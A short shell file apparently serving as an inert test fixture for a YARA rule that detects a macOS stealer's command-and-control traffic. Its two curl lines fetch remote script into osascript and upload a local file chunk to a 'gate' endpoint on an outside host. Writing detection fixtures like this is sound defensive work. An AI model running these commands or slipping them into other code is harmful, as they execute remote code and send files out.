#!/bin/zsh
# Inert YARA fixture for CERBER_MacOS_MacSync_C2 - text only, not a working sample.
curl -s "http://jmpbowl.xyz/dynamic?txd=TOKEN" | osascript
curl -s -X PUT "http://jmpbowl.xyz/gate?buildtxd=TOKEN&upload_id=1" --data-binary @/tmp/chunk
